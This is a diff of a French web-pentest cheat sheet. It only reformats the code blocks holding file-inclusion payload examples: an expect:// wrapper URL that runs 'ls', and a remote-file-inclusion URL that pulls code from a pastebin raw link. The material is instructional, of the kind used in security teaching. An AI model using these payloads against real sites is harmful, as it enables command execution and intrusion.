@@ -121,9 +121,7 @@ La payload est <?php phpinfo(); ?>
 
 **Wrapper expect://**
 
-```
-https://fhbapt.github.io/?page=expect://ls
-```
+```https://fhbapt.github.io/?page=expect://ls```
 
 ### RFI (Remote File Inclusion) <a name="rfi"></a>
 
@@ -137,6 +135,4 @@ Exemple de RFI :
 
 Utilisation de pastbin pour émuler le serveur et inclure le code du pastbin:
 
-```
-https://fhbapt.github.io/?page=https://pastebin.com/raw/G68SZPQG
-``` 
+```https://fhbapt.github.io/?page=https://pastebin.com/raw/G68SZPQG``` 
